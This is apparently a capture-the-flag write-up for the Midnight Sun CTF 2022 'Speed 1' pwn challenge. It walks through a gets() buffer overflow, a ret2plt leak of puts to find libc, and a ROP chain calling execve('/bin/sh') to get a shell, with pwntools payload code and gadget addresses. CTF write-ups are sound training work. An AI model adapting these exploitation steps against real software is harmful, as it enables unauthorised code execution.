Midnight Sun CTF Quals 2022 - Speed 1 (PWN)
==

We are given a 64 bits binary with it's libc, with the following protections :

![](https://i.imgur.com/Nei6IxH.png)

No canary, no PIE (Position Independent Executable) and NX enable with a Partial RELRO.

The decompiled main function is the following : 

```c
int main(void)
{
    char buffer [32];
  
    setvbuf(stdin,(char *)0x0,2,0);
    setvbuf(stdout,(char *)0x0,2,0);
    alarm(0x3c);
    print_banner();
    printf("b0fz: ");
    gets(buffer);
    return 0;
}
```

There a call to gets() function which is vulnerable to buffer overflow because it doesn't check the size of input.

So it's clear that the vulnerability to exploit is a buffer overflow.

# ret2plt

We are going to make a **ret2plt** to leak the address of a libc function, in our case puts, the we'll return at the beginning of the program and make our ropchain.

First stage will be to leak puts address in libc, so we're going to put in **RDI** (argument to puts) the address puts in **GOT** then call puts in **PLT**. After this we'll jump back to the beginning of **main()**.

But we first need to patch our binary with **pwninit** so the binary will use the libc given. Just launch the following command : 

```sh
pwninit --bin speed1 --libc libc.so.6
```

Now we can begin our exploit. So to overwrite **RIP** we need a padding of 40, 32 to fill the buffer, 8 to overwrite **RBP**. So let's build the first stage : 

```py
PADDING = b'A'*40
POP_RDI = 0x4012b3
POP_RSI = 0x4012b1
BIN_SH  = 0x1b45bd
MAIN    = 0x4011cf

first_stage = flat(
        PADDING,
        p64(POP_RDI),
        p64(elf.got.puts),
        p64(elf.plt.puts),
        p64(MAIN)
    )
```

So now the binary will leak the address of puts in libc and we can parse it and get libc base like that for example : 

```py
puts_leak = int(bytes.hex(r.recv()[0:6][::-1]), 16)
libc.address = puts_leak - libc.symbols.puts
```

# ret2execve

Now comes to part where I blocked for some minutes because I first tried to make a **ret2libc** with a call to **system** but unfortunately it hasn't worked for me at first try. So I didn't bother with it and try something I never tried. And I guess we can call this "technique" a **ret2execve**.

So we take a look an the arguments that takes **execve()** syscall.

![](https://i.imgur.com/lJZjHfT.png)
![](https://i.imgur.com/hjgfOC5.png)

So our command is stored in **RDI**. By making a **POP RDI** we can put our string **/bin/sh**. But we can see that the syscall has an **argv** to a random value in libc : 

![](https://i.imgur.com/2lx87SI.png)

So we need to set **RSI** to 0 then our call is equivalent to **execve("/bin/sh", NULL, NULL)**. So we are lucky there's a gadget which makes a **POP RSI** ; **POP R15**. So now we just need to build our second stage payload : 

```py
second_stage = flat(
        PADDING,
        p64(POP_RDI),
        p64(libc.address + BIN_SH),
        p64(POP_RSI),
        p64(0x0),
        p64(0x0),
        p64(execve),
        p64(exit_func)
    )
```

Now, we can launch the [exploit](https://github.com/expressitoo/Cybersecurity/blob/main/Midnight%20Sun%20CTF%20Quals%202022/Speed1/files/exploit.py), get a shell and get the flag : 

![](https://i.imgur.com/Zy8yDzl.png)

Flag : **`midnight{b3ee4fd1e8b331a237b234395d1ad0a0}`**
